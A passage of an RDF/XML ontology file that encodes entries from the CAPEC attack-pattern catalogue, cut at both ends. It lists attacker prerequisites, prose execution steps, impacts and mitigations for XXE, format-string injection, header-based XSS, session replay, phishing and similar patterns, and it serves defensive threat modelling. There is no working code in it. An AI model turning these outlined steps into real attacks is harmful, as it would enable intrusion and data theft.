        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the target) Using a browser or an automated tool  an attacker records all instances of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Exploit:DESCRIPTION:(Launch an XML Entity Linking attack) The attacker crafts malicious XML message that contains references to senstive files.TECHNIQUE:Send the malicious crafted XML message containing the reference to a senstive file to the target URL.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must follow external entity references without validating the validity of the reference target.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To send XML messages with maliciously crafted DTDs.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker104">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#150"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack104"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::552::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted applications must either expect files to be located at a specific location or  if the location of the files can be configured by the user  the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. In some cases  the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The client software should not install untrusted code from a non-authenticated server.::The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers.::Perform input validation for length of buffer inputs.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Ensure all buffer uses are consistently bounds-checked.::Use OS-level preventative functionality. Not a complete solution.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack497">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#14">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Client-side Injection-induced Buffer Overflow"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::353::118::119::74::20::680::697::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker creates a custom hostile service::STEP:2:PHASE:Explore:DESCRIPTION:The attacker acquires information about the kind of client attaching to her hostile service to determine if it contains an exploitable buffer overflow vulnerability.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker intentionally feeds malicious data to the client to exploit the buffer overflow vulnerability that she has uncovered.::STEP:4:PHASE:Exploit:DESCRIPTION:The attacker leverages the exploit to execute arbitrary code or to cause a denial of service.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker369">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#609">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:157::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cellular Traffic Intercept"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack369">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#609"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::311::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Capture all cellular and RF traffic from mobile and retransmission devices. Move bulk traffic capture to storage area for cryptanalysis of encrypted traffic  and telemetry analysis of non-encrypted data. (packet headers  cellular power data  signal strength  etc.)::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::311::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries can purchase hardware and software solutions  or create their own solutions  to capture/intercept cellular radio traffic. The cost of a basic Base Transceiver Station (BTS) to broadcast to local mobile cellular radios in mobile devices has dropped to very affordable costs. The ability of commercial cellular providers to monitor for rogue BTS stations is poor in many areas and it is assumed that rogue BTS stations exist in urban areas.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Limit the usage of formatting string functions.::Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack109">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#135">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:137::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Format String Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::134::20::74::133::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey application) The adversary takes an inventory of the entry points of the application.TECHNIQUE:Spider web sites for all available links:TECHNIQUE:List parameters  external variables  configuration files variables  etc. that are possibly used by the application.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine user-controllable input susceptible to format string injection) Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection  attempt to inject formatting characters such as %25n  %25s  etc.. The goal is to manipulate the string creation using these formatting characters.TECHNIQUE:Inject probe payload which contains formatting characters (%25s  %25d  %25n  etc.) through input parameters.::STEP:3:PHASE:Exploit:DESCRIPTION:(Try to exploit the Format String Injection vulnerability) After determining that a given input is vulnerable to format string injection  hypothesize what the underlying usage looks like and the associated constraints.TECHNIQUE:Insert various formatting characters to read or write the memory  e.g. overwrite return address  etc.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an application that may display sensitive information should clear the screen contents before a screenshot is taken. This can be accomplished by setting the key window&apos;s hidden property to YES. This code to hide the contents should be placed in both the applicationWillResignActive() and applicationDidEnterBackground() methods.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack74">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#498">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:545::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Probe iOS Screenshots"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker236">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#464">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:554::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Evercookie"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack236">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#464"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::359::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::359::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim&apos;s browser is not configured to reject all cookiesThe victim visits a website that serves the attackers&apos; evercookie::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Evercookie source code::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker103">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#86">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:588::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XSS Through HTTP Headers"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack103">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#86"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::80::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using a browser or an automated tool  an attacker follows all public links on a web site. He records all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE  but also Content-Type  etc.)TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.:TECHNIQUE:Look for HTML meta tags that could be injectable:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe identified potential entry points for XSS vulnerability)The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. He records all the responses from the server that include unmodified versions of his script. The attacker tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::80::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target software must be a client that allows scripting communication from remote hosts.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To achieve a redirection and use of less trusted source  an attacker can simply edit HTTP Headers that are sent to client machine.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser&apos;s executable process.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Always invalidate a session ID after the user logout.::Setup a session time out for the session IDs.::Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.::Do not code send session ID with GET method  otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files  which are vulnerable to an attacker.::Encrypt the session data associated with the session ID.::Use multifactor authentication.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack472">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#60">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:593::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Reusing Session IDs (aka Session Replay)"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::294::290::346::384::488::539::200::285::664::732::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker interacts with the target host and finds that session IDs are used to authenticate users.::STEP:2:PHASE:Explore:DESCRIPTION:The attacker steals a session ID from a valid user.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID&apos;s original owner.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker235">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#181"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack235"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::1021::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim must be tricked into navigating to the attackers&apos; decoy site and performing the actions on the decoy page.::The victim&apos;s browser must support invisible Flash overlays.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to force the Flash overlay over the decoy content.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker368">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#650"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack368"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::553::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker102">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#558"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack102"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Prevent unknown or malicious software from loading through whitelisting policy.::Properly restrict the location of the software being used.::Leverage security kernel modules providing advanced access control and process restrictions like SELinux.::Monitor API calls like CreateRemoteThread  SuspendThread/SetThreadContext/ResumeThread  QueueUserAPC  and similar for Windows.::Monitor API calls like ptrace system call  use of LD_PRELOAD environment variable  dlfcn dynamic linking API calls  and similar for Linux.::Monitor processes and command-line arguments for unknown behavior related to code injection.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack431">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#640">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:251::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Inclusion of Code in Existing Process"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Integrity:SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker109">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#135"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack109"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::134::20::74::133::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must accept a strings as user input  fail to sanitize string formatting characters in the user input  and process this string using functions that interpret string formatting characters.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:In order to discover format string vulnerabilities it takes only low skill  however  converting this discovery into a working exploit requires advanced knowledge on the part of the adversary.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker412">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#58">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:233::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Restful Privilege Elevation"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack412">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#58"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::267::269::264::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::267::269::264::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker108">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#383">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:407::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Harvesting Information via API Event Monitoring"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack108">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#383"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::311::319::419::602::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is able to gather information to potentially support further nefarious activities.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::311::319::419::602::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target software is utilizing application framework APIs::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Utilize side-channel resistant implementations of all crypto algorithms.::Strong physical security of all devices that contain secret key information. (even when devices are not in use)::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack403"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker411">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#98">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:611::NATURE:CanPrecede:CAPEC ID:630::NATURE:CanPrecede:CAPEC ID:631::NATURE:CanPrecede:CAPEC ID:632::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Phishing"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack411">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#98"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
